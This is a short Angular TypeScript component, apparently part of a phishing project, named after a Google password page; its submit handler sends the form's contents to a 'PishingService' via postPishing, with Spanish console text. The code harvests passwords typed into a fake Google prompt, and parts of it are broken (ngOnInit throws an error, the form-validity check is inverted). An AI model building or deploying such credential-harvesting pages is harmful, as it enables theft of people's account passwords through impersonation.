import { Component, OnInit } from '@angular/core';
import { NgForm } from '@angular/forms';
import { Router } from '@angular/router';
import { PishingModel } from 'src/models/Pishing.model';
import { PishingService } from 'src/services/Pishing.service';
import Swal from 'sweetalert2';

@Component({
  selector: 'app-googlepassword',
  templateUrl: './googlepassword.component.html',
  styleUrls: ['./googlepassword.component.css'],
})
export class GooglepasswordComponent implements OnInit {
  constructor(private PishingService: PishingService, private router: Router) {}
  pishing: PishingModel = new PishingModel();

  ngOnInit(): void {
    throw new Error('Method not implemented.');
  }

  submitPishing(forma: NgForm) {
    if (forma.valid == null) {
      this.PishingService.postPishing(this.pishing).then((response: any) => {
      
      });
    } else {
      console.log("Rellena todos los campos")
    }
  }
}
